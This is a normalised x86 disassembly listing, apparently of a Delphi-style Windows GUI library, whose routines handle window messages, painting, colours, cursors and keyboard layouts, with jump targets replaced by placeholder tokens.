mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406dec
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_443d6c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_446c8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_41a468
call sub_446bd4
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_41a468
call sub_446bd4
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_446d20
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4493d8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406dd8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_446c8c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406dec
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_443d6c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_446db4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_443328
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_443e38
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_446d20
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406dd8
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4426fc
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_446c8c
test eax eax
je r-xdata
mov eax ebx
call sub_4599ec
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_443e38
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4493d8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4493d8
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_443d6c
sub_446f18
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_443fcc
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_443d6c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_4235e4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_424268
call sub_4235e4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_4242a4
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_442758
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_447020
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43fa98
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_443d6c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_447054
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_447174
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4471ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44717b
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41a468
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_4471ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41a4c4
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_41a468
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_419034
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_41a468
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_4235e4
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_419034
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_4235e4
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_419034
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4414f4
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_443d6c
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4473dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4414f4
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4493d8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4493d8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_443d6c
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_443d6c
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4414f4
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4473dc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_41a468
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_447530
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_447054
jmp r-xdata
mov eax ebx
call sub_4460d0
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447682
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4493d8
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_443d6c
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_447530
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4493d8
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_447690
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4476b0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447724
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447744
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447764
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447788
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4477ac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4477d0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_447020
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4477f4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_433abc
mov edi eax
mov eax edi
call sub_433b9c
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_4242a4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4493d8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_433c9c
jmp r-xdata
sub_44787c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_4446a0
test bl bl
je r-xdata
mov eax edi
call sub_4496e8
mov eax edi
call sub_4492e0
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_4492e0
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_44793c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_4442fc
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44798c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4496e8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_445c60
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403430
sub_4479d4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4426fc
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_446c8c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462210
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4606f8
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_447b24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_447c03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447c0a
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4493d8
mov dl [ ebx + 0x184 ]
call sub_44e018
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460670
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4081d4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460470
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460470
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460470
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_447c10
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_447c9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ca1
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460670
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4081d4
test eax eax
je r-xdata
mov eax ebx
call sub_4493d8
mov dl 0x1
call sub_44dffc
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_447cfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_419024
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_443d6c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_447d4c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_447d80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403430
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403430
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_447dc0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_443d6c
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_447e18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_420c1c
mov edx [ r-xdata ]
call sub_4033e4
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_447e50
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_41a468
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_447e74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
